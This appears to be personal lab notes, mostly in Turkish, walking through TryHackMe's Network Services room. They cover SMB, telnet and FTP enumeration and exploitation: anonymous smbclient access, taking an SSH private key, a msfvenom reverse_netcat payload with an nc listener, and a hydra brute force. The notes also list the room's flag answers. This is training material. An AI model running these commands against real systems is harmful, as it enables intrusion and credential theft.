# Try Hack Me NETWORK-SERVICES-

<h2> SMB-ENUMERATİON </h2>

<h4>*Enum4Linux* </h4>

<h4> nmap target -p- -vv  </h4>
-3

<br>

-smb=139,445 

<h4> enum4linux -a  targetip</h4>

<h4><a href="https://www.firatboyan.com/rid-relative-sid-security-identifier-nedir-nasil-bulunur.aspx#:~:text=Relative%20Identifier%20%28RID%29%20numaralar%C4%B1%20atan%C4%B1rken%2C%20Active%20Directory%20nesnesinin,atan%C4%B1r%20ki%20buna%20da%20Security%20Identifier%20%28SID%29%20denir."> rıd ve sıd nedir </a>  </h4>

-workgroup
<br>



-polosmb
<br>
-ubuntu 6.1
<br>
-profiles (varsayılan bir paylaşım değil ve okuma  yazma dinleme iznimiz var) ? 


<h2> SMB-EXPLOİTİNG </h2>

-smbclient//targetip/secret -U suit -p 445 

<br>

<h4> smbclient -L  //targetip  </h4>
<h4> smbmabp -H targetip  </h4>

<h4> smbclient  //targetip/profiles -U anonymous -p 445  </h4>
smb shell aldık
<br>

<h4>  get  "working from home information.txt"       </h4> 
-y
<br>
-john cactus
<br>
-ssh
<h4>  get  get id_rsa jhon-rsa   </h4> 
<h4>  get  get id_rsa.pub      </h4> 
bunlar bize jhon un ssh bağlıntısını encrip  ve hızlandırmak kullanıcı adı ve pasword girmeden hızlıca girmek için  için paetmek iiçn kullandığı public ve pravate key
<br>

-.ssh

-id_rsa
ama public keyde nde kullanıcı adını aldık

<br>

<h4>    chmod 600 /root/jhon-rsa   </h4> 
<h4>   ssh cactus@targetip  -i  /root/jhon-rsa    </h4> 
burada kullanmak istedğimiz ssh key i verdik

<br>
cactus@polosmb shell aldık 
<br>
<h4>    cat smb.txt</h4> 

-THM{smb_is_fun_eh?}



<h2> TELNET HAKKINDA  </h2>

telnet ip port
<br>

cleaar tex(plaintex) gönderiyor yerini ssh aldı kullanımı pek kalmadı




<br>

-application protocol
<br>
-ssh
<br>
-telnet 10.10.10.3 23

<br>
-encryption


<h2> TELNET ENUMERATİON </h2>
<h4>    nmap target -p- -vv -T4 </h4> 
-1

<br>

-8012

<h4>    nmap target  </h4> 
-0


<h4>  telnet target 8012   </h4> 

-backdoor

<br>


-skidy

<h2> TELNET EXPLOİTİNG </h2>

<h4>  telnet target 8012   </h4> 

-SKIDY'S BACKDOOR
<br>
komut alamıyoruz 

<br>
-N
<br>

<h4>  tcpdump ip proto \\icmp -i tun0   </h4> 


(bunu sebebi icmp paketlerini snif ediyoruz  serverde komutlarımız yürütülüyor  mu u?    ayrı bir terminalde tcpdump çalıştırıyoruz)






<h4> ping localip -c 1   </h4> 
(telnet shellin  de çalıştırıyoruz )
<br> 
evet yürütüyor 
<br>
bir payload oluşturuyoruz reverse 












<h4>  msfvenom -p cmd/unix/reverse_netcat lhost=<localhost> lport=4444 -f raw   </h4> 

-mkfifo

<br>
-nc -lvp 444

<br>




<h4> nc -lvp 444  </h4> 

telnet shellde hazırlamış olduğpumuz payloadı gönderiyoruz 
.RUN mkfifo ................


nc shelinde reverse shell aldık 

-THM{y0u_g0t_th3_t3ln3t_fl4g}

(telnet 1.1.1.1 53)

<h2>understantig ftp</h2>
active mode 
passive mode
2 kanal var komt kanalı data kanalı


-client-server

<br>
-21
<br>
-2

<h2>ftp enumerating </h2>
<h4> nmap targer -p- -sV  -vv </h4> 


-2
<br>
-21
<br>
-vsftpd

<br>


<h4> ftp targetip </h4> 

<h4> anonymous </h4> 

<h4> \n </h4>



<h4> get dosya adı </h4>
<br>
-mike
<br>







<h2>ftp exploiting  </h2>





<h4>hydra targetip ftp -l mike -P  usersahere/wordlist -v</h4>


ftp
targetip
mike 
password
<h4>get ftp.txt</h4>



 
-THM{y0y_g0t_th3_ftp_fl4g}


















